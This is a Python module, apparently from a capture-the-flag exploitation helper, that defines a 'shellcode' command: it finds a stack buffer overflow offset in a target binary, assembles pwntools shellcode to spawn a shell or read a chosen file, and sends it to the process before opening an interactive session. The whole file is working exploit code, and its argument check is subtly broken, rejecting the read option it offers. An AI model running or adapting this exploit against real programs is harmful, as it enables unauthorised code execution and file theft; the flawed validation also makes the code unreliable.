import argparse
import sys
import pathlib
import pwn

import logger
from binary import Binary

class Shellcode:
    command = 'shellcode'

    def __init__(self):
        parser = argparse.ArgumentParser(
            description='Generate executable code and send it'
        )

        parser.add_argument('-s', '--shell', help='Get a shell', action='store_true')
        parser.add_argument('-r', '--read', type=str, help='Read specified file', metavar='file')
        parser.add_argument('binary', nargs='?', type=pathlib.Path, help='Binary to exploit')

        sysargs = sys.argv[2:]

        if len(sysargs):
            args = parser.parse_args(sys.argv[2:])

            if not args.binary or (args.read is not None or not args.shell):
                logger.error(f'You have to specify a {logger.custom("binary", color="red", style="bold")} and a {logger.custom("file to read", color="red", style="bold")} or {logger.custom("shell option", color="red", style="bold")} to exploit\n')
                parser.print_help()
                sys.exit(1)

            self.shell = args.shell
            self.read = args.read

            self.binary = Binary(args.binary)
            self.main()

        else:
            parser.print_help()

    # main {{{
    def main(self):
        logger.info('Starting exploitation\n')

        overflow_offset = self.binary.get_overflow_offset()

        if overflow_offset == -1:
            logger.error(f'No overflow offset found ¯\_(ツ)_/¯')
            sys.exit(1)

        logger.success(f'Overflow offset found: {overflow_offset}')

        if self.shell:
            self.shellcode = pwn.asm(getattr(pwn.shellcraft, self.binary.elf.arch).sh(), arch=self.binary.elf.arch)

        elif self.read:
            self.shellcode = pwn.asm(getattr(pwn.shellcraft, self.binary.elf.arch).cat(self.read), arch=self.binary.elf.arch)

        process = pwn.process(self.binary.path)
        process.sendline(b'A'* overflow_offset + self.shellcode)
        logger.success('EXPLOIT SUCCESS\n')

        process.interactive()

        sys.exit(0)
    # }}}
